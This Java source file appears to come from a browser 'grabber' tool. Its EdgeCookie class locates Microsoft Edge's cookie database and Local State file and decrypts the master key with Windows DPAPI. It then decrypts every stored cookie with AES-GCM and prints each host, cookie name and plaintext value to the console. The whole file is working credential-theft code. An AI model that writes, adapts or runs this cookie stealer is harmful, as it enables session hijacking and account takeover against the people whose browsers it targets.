package ninja.maki.grabber.edge;

import com.sun.jna.platform.win32.Crypt32Util;
import ninja.maki.utils.SystemUtil;
import org.apache.commons.codec.binary.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.Arrays;

public class EdgeCookie {
    public static void grab() {
        SystemUtil.console();
        String cookieTemp = System.getProperty("java.io.tmpdir") + "edgecookie.tmp";
        String cookiePath = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies";
        File cookieTempFile = new File(cookieTemp);
        try {
            cookieTempFile = File.createTempFile("edgecookie", ".tmp");
            cookieTemp = cookieTempFile.getAbsolutePath();
        }catch (IOException e){
            SystemUtil.console("Failed to create temp file.");
        }
        File cookiePathFile = new File(cookiePath);
        if(cookiePathFile.exists()) {
            try {
                String cookieState = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
                File cookieStateFile = new File(cookieState);
                StringBuilder cryptMasterKey = new StringBuilder();
                try (BufferedReader reader = new BufferedReader(new FileReader(cookieStateFile))) {
                    String tempString;
                    while ((tempString = reader.readLine()) != null) {
                        cryptMasterKey.append(tempString);
                    }
                } catch (IOException e) {
                    SystemUtil.console("Failed to read file \"" + cookieState + "\".");
                }
                cryptMasterKey = new StringBuilder(SystemUtil.getSubString(cryptMasterKey.toString(), "\"encrypted_key\":\"", "\""));
                byte[] masterKey = Base64.decodeBase64(cryptMasterKey.toString());
                if (new String(masterKey).startsWith("DPAPI")) {
                    SystemUtil.console("Get Encrypted Key.");
                } else {
                    throw new Exception("Failed to get Encrypted Key.");
                }
                masterKey = Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(masterKey, "DPAPI".length(), masterKey.length));
                if (masterKey.length != 256 / 8) throw new Exception("Failed to decrypt key.");
                try {
                    SystemUtil.copyFile(cookiePathFile, cookieTempFile);
                    SystemUtil.console("Copy \"" + cookiePath + "\" to \"" + cookieTemp + "\".");
                } catch (IOException e) {
                    SystemUtil.console("Failed to copy \"" + cookiePath + "\" to \"" + cookieTemp + "\".");
                }
                Connection connection;
                Statement statement;
                try {
                    Class.forName("org.sqlite.JDBC");
                    connection = DriverManager.getConnection("jdbc:sqlite:" + cookieTemp);
                    connection.setAutoCommit(false);
                    SystemUtil.console("Connect database \"" + cookieTemp + "\".");
                    statement = connection.createStatement();
                    ResultSet resultSet = statement.executeQuery("SELECT host_key, name,encrypted_value FROM cookies");
                    SystemUtil.console();
                    SystemUtil.console("==================================================================");
                    while (resultSet.next()) {
                        String hostKey = resultSet.getString("host_key");
                        String name = resultSet.getString("name");
                        String cryptPassword = resultSet.getString("encrypted_value");
                        InputStream inputStream = resultSet.getBinaryStream("encrypted_value");
                        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                        int ch;
                        while ((ch = inputStream.read()) != -1) {
                            byteArrayOutputStream.write(ch);
                        }
                        byte[] cookieByte = byteArrayOutputStream.toByteArray();
                        byteArrayOutputStream.close();
                        String cookie;
                        if (cryptPassword.startsWith("v10")) {
                            byte[] nonce = Arrays.copyOfRange(cookieByte, "v10".length(), "v10".length() + 96 / 8);
                            cookieByte = Arrays.copyOfRange(cookieByte, "v10".length() + 96 / 8, cookieByte.length);
                            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
                            SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
                            GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(16 * 8, nonce);
                            cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
                            cookie = new String(cipher.doFinal(cookieByte));
                        } else {
                            cookie = new String(Crypt32Util.cryptUnprotectData(cookieByte), StandardCharsets.UTF_8);
                        }
                        SystemUtil.console();
                        SystemUtil.console("Host Key -> " + hostKey);
                        SystemUtil.console(name + " -> " + cookie);
                    }
                    SystemUtil.console();
                    SystemUtil.console("==================================================================");
                    resultSet.close();
                    statement.close();
                    connection.close();
                } catch (Exception e) {
                    SystemUtil.console("Failed to get info.");
                }
            }catch (Exception e) {
                SystemUtil.console(e.getMessage());
            }
        }else {
            SystemUtil.console("\"" + cookiePath + "\" is not founded.");
        }
        SystemUtil.console();
        if(cookieTempFile.exists()) {
            if(cookieTempFile.delete()) {
                SystemUtil.console("Delete \"" + cookieTemp + "\".");
            }else {
                SystemUtil.console("Failed to delete \"" + cookieTemp + "\".");
            }
        }
    }
}
